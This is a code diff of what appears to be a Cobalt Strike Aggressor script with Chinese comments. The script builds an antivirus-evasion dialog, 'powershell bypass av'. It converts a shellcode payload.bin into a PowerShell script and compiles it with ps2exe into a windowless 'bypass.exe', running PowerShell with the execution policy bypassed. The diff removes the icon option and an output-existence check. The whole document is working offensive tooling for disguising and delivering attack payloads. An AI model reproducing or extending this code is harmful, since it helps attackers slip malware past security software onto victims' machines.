@@ -38,7 +38,6 @@ sub payload_bin_to_ps1 {
 
 sub show {
 	$bin_path = $3["bin"];
-	$ico_path = $3["ico"];
 	$payload_file_ps1 = $output_file.'\\'.$3["payload"];
 	$output_exe = $output_file.'\\'.$3["output_exe"];
 	$ps2exe = $path.'\.\\ps2exe.ps1';
@@ -49,18 +48,14 @@ sub show {
 		$int_version = left($version, 1);
 		println($payload_file_ps1);
 		if ($int_version == "4") {
-			$process = exec('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime40" ');
+			$process = exec('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -noConsole -runtime40" ');
 		} else {
-			$process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime20 | powershell -');
+			$process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -noConsole -runtime20 | powershell -');
 		}
 		@data = readAll($process);
 		println(@data);
 		closef($process);
-		if (-exists $output_exe) {
-			show_message("\n加载bin文件：".$bin_path."\n输出payload文件：".$payload_file_ps1."\n版本是：".$3["version"]."\n输出exe地址：".$output_exe);
-		} else {
-			show_message('运行异常，请查看script console');
-		}
+		show_message("\n加载bin文件：".$bin_path."\n输出payload文件：".$payload_file_ps1."\n版本是：".$3["version"]."\n输出exe地址：".$output_exe);
 	} else {
 		show_message('请指定bin文件');
 	}
@@ -68,10 +63,9 @@ sub show {
 }
 
 sub dialog_powershell {
-	$info = dialog("powershell bypass av",%(ps2exe => "ps2exe.ps1",bin => "payload.bin",ico => "a.ico", payload => "payload_cs.ps1",version => "4.0",output_exe => "bypass.exe"),&show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他
+	$info = dialog("powershell bypass av",%(ps2exe => "ps2exe.ps1",bin => "payload.bin",payload => "payload_cs.ps1",version => "4.0",output_exe => "bypass.exe"),&show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他
 	# drow_text($info,"ps2exe","ps2exe.ps1");
 	drow_file($info,"bin","Choose: default payload.bin");
-	drow_file($info,"ico","Choose: 添加ico图标");
 	drow_text($info, "payload", "生成ps1");
 	drow_combobox($info, "version", "Version: ", @("powershell 4.0", "powershell 2.0"));
 	drow_text($info,"output_exe","输出地址："); 
